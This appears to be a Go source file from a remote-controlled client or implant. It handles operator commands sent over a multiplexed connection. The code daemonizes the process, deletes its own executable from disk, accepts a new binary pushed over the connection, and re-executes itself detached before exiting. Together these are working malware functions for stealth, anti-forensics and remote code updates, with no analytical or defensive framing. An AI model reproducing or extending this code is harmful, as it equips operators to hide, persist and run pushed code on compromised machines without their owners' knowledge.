// +build extra all

package base

import (
	"net"
//	"io"
	"os"
	"os/exec"
	"syscall"
//	"sync"
//	"time"
//	"runtime"
	"bytes"
	"io/ioutil"

	kit "local/toolkit"
	"lib/smux"
	"lib/godaemon"
)

func init() {
	RegOps(B_dodaemon, ccX)
	RegOps(B_apoptosis, ccX)
	RegOps(B_rebirth, ccX)
	RegOps(B_evolution, ccX)

	RegInit(extraInit)
}

var extraInit = func(c *Client) {
	loadSelf(c)

	if c.Daemon {
		godaemon.MakeDaemon(&godaemon.DaemonAttr{})

		if c.AutoClean {
			cleanSelf()
		}
	}
}

var ccX = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
	switch op {
	case B_reconn:
		mux.Close()

	case B_kill:
		os.Exit(0)

	case B_dodaemon:
		godaemon.MakeDaemon(&godaemon.DaemonAttr{})

	case B_apoptosis:
		cleanSelf()

	case B_evolution:
		fhb, err := kit.ReadVTagByte(p1)
		if err != nil {
//fmt.Println("[evolution][err]fhb", err)
			break
		}

		fb, err := kit.ReadVTagByte(p1)
		if err != nil {
//fmt.Println("[evolution][err]fb", err)
			break
		}

		checkb := kit.HashBytes256(fb)
//fmt.Println("[evolution]", len(fb), kit.Hex(checkb), kit.Hex(fhb))
		if !bytes.Equal(checkb, fhb) {
//fmt.Println("[evolution][err]!bytes.Equal", kit.Hex(checkb), kit.Hex(fhb))
			break
		}

		c.binMx.Lock()
		c.selfbyte1 = c.selfbyte
		c.selfhex1 = c.selfhex
		c.selfbyte = fb
		c.selfhex = fhb
		c.binMx.Unlock()
		fallthrough

	case B_rebirth:
		dumpSelf(c)
	}
}

var cleanSelf = func () {
	name, err := kit.GetSelf()
	if err != nil {
		return
	}
	os.Remove(name)
}

var loadSelf = func (c *Client) {
	fd, err := os.OpenFile("/proc/self/exe", os.O_RDONLY, 0400)
	if err != nil {
//fmt.Println("[err]os.OpenFile", err)
		return
	}
	defer fd.Close()

	b, err := ioutil.ReadAll(fd)
	if err != nil {
		c.selfbyte = nil
		return
	}

	c.binMx.Lock()
	c.selfhex = kit.HashBytes256(b)
	c.selfbyte = b
	c.binMx.Unlock()
}

var dumpSelf = func (c *Client) {
	ofd, ofp, err := kit.TryWX()
	if err != nil {
//fmt.Println("[err]TryWX()", err)
		return
	}

	c.binMx.Lock()
	defer c.binMx.Unlock()
	if c.selfbyte == nil {
		return
	}

	ofd.Write(c.selfbyte)
	ofd.Sync()
	ofd.Close()

	pl := exec.Command(ofp, os.Args[1:]...)
	pl.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true,
//		Noctty: true,
	}
	err = pl.Start()

	// TODO: fallback
	if err != nil {
//fmt.Println("[err]pl.Start()", err)
		c.selfbyte = c.selfbyte1
		c.selfhex = c.selfhex1
		c.selfbyte1 = nil
		c.selfhex1 = nil
		return
	}
	pl.Process.Release()
	os.Exit(0)
}

